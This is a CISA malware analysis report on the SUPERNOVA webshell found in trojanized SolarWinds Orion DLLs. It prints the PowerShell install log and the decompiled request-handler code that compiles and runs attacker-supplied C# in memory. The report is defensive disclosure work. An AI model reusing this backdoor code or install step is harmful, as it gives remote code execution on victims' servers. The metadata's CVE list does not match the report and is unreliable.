{
  "markdown": "\n\n\n\n\n\n\nNotification\n\nThis report is provided \"as is\" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained herein. The DHS does not endorse any commercial product or service referenced in this bulletin or otherwise.\nThis document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Proftocol (TLP), see http://www.cisa.gov/tlp.\n\nSummary\n\nDescription\nThis report provides detailed analysis of several malicious artifacts, affecting the SolarWinds Orion product, which have been identified by the security company FireEye as SUPERNOVA. According to a SolarWinds advisory, SUPERNOVA is not embedded within the Orion platform as a supply chain attack; rather, it is placed by an attacker directly on a system that hosts SolarWinds Orion and is designed to appear as part of the SolarWinds product. CISA's assessment is that SUPERNOVA is not part of the SolarWinds supply chain attack described in Alert AA20-352A. See the section in Microsoft\u2019s blog titled \u201cAdditional malware discovered\u201d for more information.\n\n\t\t\tThis report describes the analysis of a PowerShell script that decodes and installs SUPERNOVA, a malicious webshell backdoor. SUPERNOVA is embedded in a trojanized version of the Solarwinds Orion Web Application module called \u201cApp_Web_logoimagehandler.ashx.b6031896.dll.\" The SUPERNOVA malware allows a remote operator to dynamically inject C# source code into a web portal provided via the SolarWinds software suite. The injected code is compiled and directly executed in memory.\nFor a downloadable copy of indicators of compromise (IOCs), see: MAR-10319053-1.v2.stix\nReferences\nhttps://us-cert.cisa.gov/ncas/alerts/aa20-352a\nhttps://www.solarwinds.com/securityadvisory#anchor2\nhttps://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/\nSubmitted Files (2)\n290951fcc76b497f13dcb756883be3377cd3a4692e51350c92cac157fc87e515 (1.ps1)\nc15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71 (App_Web_logoimagehandler.ashx....)\n\nFindings\n\n290951fcc76b497f13dcb756883be3377cd3a4692e51350c92cac157fc87e515\nTags\ntrojan\nDetails\n\n\n\nName\n1.ps1\n\n\nSize\n10609 bytes\n\n\nType\nASCII text, with very long lines\n\n\nMD5\n4423a4353a0e7972090413deb40d56ad\n\n\nSHA1\n8004d78e6934efb4dea8baf48a589c2c1ed10bf3\n\n\nSHA256\n290951fcc76b497f13dcb756883be3377cd3a4692e51350c92cac157fc87e515\n\n\nSHA512\n5d2dee3c8e4c6a4fa1d84e434ab0b864245fae51360e03ed7338c2b40d7c1d61aad755f8c54615197100dd3b8bfd00d33b256178123002b7c07779c257fa13db\n\n\nssdeep\n192:9x2OrPgH8XWECNsW4IX4SLY0tqIeZ9StIGca/HjKxnlyImIwN:Fr28XWECNsbIX4SLY0BeZ9StI9OHjMlw\n\n\nEntropy\n4.457683\n\n\n\nAntivirus\n\n\n\nMicrosoft Security Essentials\nTrojan:MSIL/Solorigate.G!dha\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n290951fcc7...\nContains\nc15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71\n\n\n\nDescription\nThis file is an event log that details the execution of a PowerShell script designed to Base64 decode and install a 32-bit .NET dynamic-link library (DLL) into the following location: \"C:\\inetpub\\SolarWinds\\bin\\App_Web_logoimagehandler.ashx.b6031896.dll (c15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71). The DLL is patched with the SUPERNOVA webshell and is a replacement for a legitimate SolarWinds DLL.\n\n\t\t\tDisplayed below is a portion of the event log with the victim information redacted. It indicates the malicious PowerShell was executed by the legitimate SolarWinds application \"E:\\Program Files (x86)\\SolarWinds\\Orion\\SolarWinds.BusinessLayerHost.exe.\"\n\n\t\t\t--Begin event log--\n\t\t\tAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\\";$f=\\\"C:\\inetpub\\SolarWinds\\bin\\App_Web_logoimagehandler.ashx.b6031896.dll\\\";$bs=[Convert]::FromBase64String($b);[IO.File]::WriteAllBytes($f $bs)' 'S-1-0-0' '-' '-' '0x0000000000000000' 'E:\\Program Files (x86)\\SolarWinds\\Orion\\SolarWinds.BusinessLayerHost.exe' 'S-1-16-16384'] Computer Name: [redacted].[redacted].net Record Number: 12551353 Event Level: 0\n\t\t\t--End event log--\n\n\nc15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71\nTags\nbackdoortrojan\nDetails\n\n\n\nName\nApp_Web_logoimagehandler.ashx.b6031896.dll\n\n\nSize\n7680 bytes\n\n\nType\nPE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\n\nMD5\n56ceb6d0011d87b6e4d7023d7ef85676\n\n\nSHA1\n75af292f34789a1c782ea36c7127bf6106f595e8\n\n\nSHA256\nc15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71\n\n\nSHA512\nf7eac6ab99fe45ca46417cdca36ba27560d5f8a2f37f378ba97636662595d55fa34f749716971aa96a862e37e0199eb6cb905636e6ab0123cfa089adba450629\n\n\nssdeep\n192:8/SqRzbt0GBDawA5uT8wSlyDDGTBNFkQ:8/SyHKGBDax5uThDD6BNr\n\n\nEntropy\n4.622450\n\n\n\nAntivirus\n\n\n\nAhnlab\nBackdoor/Win32.SunBurst\n\n\nAntiy\nTrojan/MSIL.Agent\n\n\nAvira\nTR/Sunburst.BR\n\n\nBitDefender\nTrojan.Supernova.A\n\n\nClamav\nWin.Countermeasure.SUPERNOVA-9808999-1\n\n\nComodo\nBackdoor\n\n\nCyren\nW32/Supernova.GYFL-6114\n\n\nESET\na variant of MSIL/SunBurst.A trojan\n\n\nEmsisoft\nTrojan.Supernova.A (B)\n\n\nIkarus\nBackdoor.Sunburst\n\n\nK7\nTrojan ( 00574a531 )\n\n\nLavasoft\nTrojan.Supernova.A\n\n\nMcAfee\nTrojan-sunburst\n\n\nMicrosoft Security Essentials\nTrojan:MSIL/Solorigate.G!dha\n\n\nNANOAV\nTrojan.Win32.Sunburst.iduxaq\n\n\nQuick Heal\nBackdoor.Sunburst\n\n\nSophos\nMal/Sunburst-B\n\n\nSymantec\nBackdoor.SuperNova\n\n\nSystweak\ntrojan-backdoor.sunburst-r\n\n\nTrendMicro\nTrojan.59AF4B5F\n\n\nTrendMicro House Call\nTrojan.59AF4B5F\n\n\nVirusBlokAda\nTScope.Trojan.MSIL\n\n\nZillya!\nTrojan.SunBurst.Win32.3\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\n\n\n\n100\n5976f9a3f7dcd2c124f1664003a1bb607bc22abc2c95abe5ecd645a5dbfe2c6c\n\n\n\nPE Metadata\n\n\n\nCompile Date\n2020-03-24 05:16:10-04:00\n\n\nImport Hash\ndae02f32a21e03ce65412f6e56942daa\n\n\nCompany Name\nNone\n\n\nFile Description\n\u00a0\n\n\nInternal Name\nApp_Web_logoimagehandler.ashx.b6031896.dll\n\n\nLegal Copyright\n\u00a0\n\n\nOriginal Filename\nApp_Web_logoimagehandler.ashx.b6031896.dll\n\n\nProduct Name\nNone\n\n\nProduct Version\n0.0.0.0\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\n21556dbcb227ba907e33b0847b427ef4\nheader\n512\n2.597488\n\n\n9002a963c87901397a986c3333d09627\n.text\n5632\n5.285309\n\n\n78888431b10a2bf283387437a750bca3\n.rsrc\n1024\n2.583328\n\n\n45ded0a8dacde15cb402adfe11b0fe3e\n.reloc\n512\n0.081539\n\n\n\nPackers/Compilers/Cryptors\n\n\n\nMicrosoft Visual C# / Basic .NET\n\n\n\nRelationships\n\n\n\nc15abaf51e...\nContained_Within\n290951fcc76b497f13dcb756883be3377cd3a4692e51350c92cac157fc87e515\n\n\n\nDescription\nThis file is a 32-bit .NET DLL that has been identified as a modified SolarWinds plug-in. The malware patched into this plug-in has been identified as SUPERNOVA. The modification includes the \"DynamicRun\" export function which is designed to accept and parse provided arguments. The arguments are expected to partially contain C# code, which the function will compile and execute directly in system memory. The purpose of this malware indicates the attacker has identified a vulnerability allowing the ability to dynamically provide a custom \"HttpContext\" data structure to the web application\u2019s \"ProcessRequest\" function.\n\n\t\t\tThe ProcessRequest function takes an HttpContext Data structure as an argument. It parses portions of the request substructure of the parent HttpContext data structure using the keys \u201ccodes\u201d, \u201cclazz\u201d, \u201cmethod\u201d, and \u201cargs\u201d. The parsed data is placed in the respective variables codes, clazz, method, and args. These four variables are then provided as arguments to the DynamicRun function described next.\n\n\t\t\tThe \"DynamicRun\" function is designed to accept C# code and then dynamically compile and execute it. The \"codes\" variable provided to the function contains the actual C# code. The \"clazz\" variable provides the class name that is used when compiling the source code. The \"method\" variable will contain the function name that will be called for the newly compiled class. The \"args\" variable will contain the arguments provided to the executed malicious class.\n\n\t\t\tAfter parsing out and executing the provided code, the \"ProcessRequest\" function will continue on to call a function named \"WebSettingsDAL.get_NewNOCSiteLogo.\" Analysis indicates this is a valid SolarWinds function designed to render the product logo on a web application.\n\n\n\n\t\t\t--Begin ProcessRequest Function--\n\t\t\tpublic void ProcessRequest(HttpContext context)\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0try\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 string codes = context.Request[\"codes\"];\n\t\t\t\u00a0\u00a0\u00a0 string clazz = context.Request[\"clazz\"];\n\t\t\t\u00a0\u00a0\u00a0 string method = context.Request[\"method\"];\n\t\t\t\u00a0\u00a0\u00a0 string[] args = context.Request[\"args\"].Split('\\n');\n\t\t\t\u00a0\u00a0\u00a0 context.Response.ContentType = \"text/plain\";\n\t\t\t\u00a0\u00a0\u00a0 context.Response.Write(this.DynamicRun(codes, clazz, method, args));\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0catch (Exception ex)\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0NameValueCollection queryString = HttpUtility.ParseQueryString(context.Request.Url.Query);\n\t\t\t\u00a0\u00a0\u00a0try\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 string str1 = queryString[\"id\"];\n\t\t\t\u00a0\u00a0\u00a0 string s;\n\t\t\t\u00a0\u00a0\u00a0 if (!(str1 == \"SitelogoImage\"))\n\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (!(str1 == \"SiteNoclogoImage\"))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 throw new ArgumentOutOfRangeException(queryString[\"id\"]);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0s = WebSettingsDAL.get_NewNOCSiteLogo();\n\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t\u00a0\u00a0\u00a0 else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0s = WebSettingsDAL.get_NewSiteLogo();\n\t\t\t\u00a0\u00a0\u00a0 byte[] buffer = Convert.FromBase64String(s);\n\t\t\t\u00a0\u00a0\u00a0 if ((buffer == null || buffer.Length == 0) && File.Exists(HttpContext.Current.Server.MapPath(\"//NetPerfMon//images//NoLogo.gif\")))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0buffer = File.ReadAllBytes(HttpContext.Current.Server.MapPath(\"//NetPerfMon//images//NoLogo.gif\"));\n\t\t\t\u00a0\u00a0\u00a0 string str2 = buffer.Length < 2 || buffer[0] != byte.MaxValue || buffer[1] != (byte) 216 ? (buffer.Length < 3 || buffer[0] != (byte) 71 || (buffer[1] != (byte) 73 || buffer[2] != (byte) 70) ? (buffer.Length < 8 || buffer[0] != (byte) 137 || (buffer[1] != (byte) 80 || buffer[2] != (byte) 78) || (buffer[3] != (byte) 71 || buffer[4] != (byte) 13 || (buffer[5] != (byte) 10 || buffer[6] != (byte) 26)) || buffer[7] != (byte) 10 ? \"image/jpeg\" : \"image/png\") : \"image/gif\") : \"image/jpeg\";\n\t\t\t\u00a0\u00a0\u00a0 context.Response.OutputStream.Write(buffer, 0, buffer.Length);\n\t\t\t\u00a0\u00a0\u00a0 context.Response.ContentType = str2;\n\t\t\t\u00a0\u00a0\u00a0 context.Response.Cache.SetCacheability(HttpCacheability.Private);\n\t\t\t\u00a0\u00a0\u00a0 context.Response.StatusDescription = \"OK\";\n\t\t\t\u00a0\u00a0\u00a0 context.Response.StatusCode = 200;\n\t\t\t\u00a0\u00a0\u00a0 return;\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0catch (Exception ex)\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 LogoImageHandler._log.Error((object) \"Unexpected error trying to provide logo image for the page.\", ex);\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0context.Response.Cache.SetCacheability(HttpCacheability.NoCache);\n\t\t\t\u00a0\u00a0\u00a0context.Response.StatusDescription = \"NO IMAGE\";\n\t\t\t\u00a0\u00a0\u00a0context.Response.StatusCode = 500;\n\t\t\t}\n\t\t\t--End ProcessRequest Function--\n\n\t\t\t--Begin DynamicRun Function--\n\t\t\tpublic string DynamicRun(string codes, string clazz, string method, string[] args)\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0ICodeCompiler compiler = new CSharpCodeProvider().CreateCompiler();\n\t\t\t\u00a0\u00a0\u00a0CompilerParameters options = new CompilerParameters();\n\t\t\t\u00a0\u00a0\u00a0options.ReferencedAssemblies.Add(\"System.dll\");\n\t\t\t\u00a0\u00a0\u00a0options.ReferencedAssemblies.Add(\"System.ServiceModel.dll\");\n\t\t\t\u00a0\u00a0\u00a0options.ReferencedAssemblies.Add(\"System.Data.dll\");\n\t\t\t\u00a0\u00a0\u00a0options.ReferencedAssemblies.Add(\"System.Runtime.dll\");\n\t\t\t\u00a0\u00a0\u00a0options.GenerateExecutable = false;\n\t\t\t\u00a0\u00a0\u00a0options.GenerateInMemory = true;\n\t\t\t\u00a0\u00a0\u00a0string source = codes;\n\t\t\t\u00a0\u00a0\u00a0CompilerResults compilerResults = compiler.CompileAssemblyFromSource(options, source);\n\t\t\t\u00a0\u00a0\u00a0if (compilerResults.Errors.HasErrors)\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 // ISSUE: reference to a compiler-generated field\n\t\t\t\u00a0\u00a0\u00a0 // ISSUE: reference to a compiler-generated field\n\t\t\t\u00a0\u00a0\u00a0 // ISSUE: reference to a compiler-generated field\n\t\t\t\u00a0\u00a0\u00a0 // ISSUE: method pointer\n\t\t\t\u00a0\u00a0\u00a0 string.Join(Environment.NewLine, (IEnumerable<string>) Enumerable.Select<CompilerError, string>((IEnumerable<M0>) compilerResults.Errors.Cast<CompilerError>(), (Func<M0, M1>) (LogoImageHandler.\\u003C\\u003Ec.\\u003C\\u003E9__3_0 ?? (LogoImageHandler.\\u003C\\u003Ec.\\u003C\\u003E9__3_0 = new Func<CompilerError, string>((object) LogoImageHandler.\\u003C\\u003Ec.\\u003C\\u003E9, __methodptr(\\u003CDynamicRun\\u003Eb__3_0))))));\n\t\t\t\u00a0\u00a0\u00a0 Console.WriteLine(\"error\");\n\t\t\t\u00a0\u00a0\u00a0 return compilerResults.Errors.ToString();\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0object instance = compilerResults.CompiledAssembly.CreateInstance(clazz);\n\t\t\t\u00a0\u00a0\u00a0return (string) instance.GetType().GetMethod(method).Invoke(instance, (object[]) args);\n\t\t\t}\n\t\t\t--End DynamicRun Function--\nScreenshots\n \n\nFigure 1 - \n\n\nRelationship Summary\n\n\n\n\n290951fcc7...\nContains\nc15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71\n\n\nc15abaf51e...\nContained_Within\n290951fcc76b497f13dcb756883be3377cd3a4692e51350c92cac157fc87e515\n\n\n\n\nRecommendations\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date.\nDisable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file header).\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nScan all software downloaded from the Internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, \"Guide to Malware Incident Prevention & Handling for Desktops and Laptops\".\n\nContact Information\n\n\n1-888-282-0870\nCISA Central\u00a0(UNCLASS)\nCISA SIPR (SIPRNET)\nCISA IC (JWICS)\n\nCISA continuously strives to improve its products and services. You can help by answering a very short series of questions about this product at the following URL: https://us-cert.cisa.gov/forms/feedback/\n\nDocument FAQ\n\nWhat is a MIFR? A Malware Initial Findings Report (MIFR) is intended to provide organizations with malware analysis in a timely manner. In most instances this report will provide initial indicators for computer and network defense. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nWhat is a MAR? A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired via manual reverse engineering. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nCan I edit this document? This document is not to be edited in any way by recipients. All comments or questions related to this document should be directed to the CISA at 1-888-282-0870 or CISA Service Desk.\nCan I submit malware to CISA? Malware samples can be submitted via three methods:\n\nWeb: https://malware.us-cert.gov\nE-Mail: submit@malware.us-cert.gov\nFTP: ftp.malware.us-cert.gov (anonymous)\n\nCISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and phishing-related scams. Reporting forms can be found on CISA's homepage at www.cisa.gov.\n\n\n\n\n\n\n\n\nRevisions\n\nJanuary 27, 2021: Initial Version|November 17, 2021: Removed a file that was determined to be a legitimate SolarWinds file\n",
  "cves": [
    "CVE-2022-47966",
    "CVE-2022-42475"
  ],
  "techniques": [],
  "advisory": "ar21-027a",
  "title": "MAR-10319053-1.v2 - Supernova | CISA",
  "source": "analysis-reports",
  "id": "1dff9067958d669449625b7bb5dacc6a08f5bc40049678a6bb6982e1d5035e2f"
}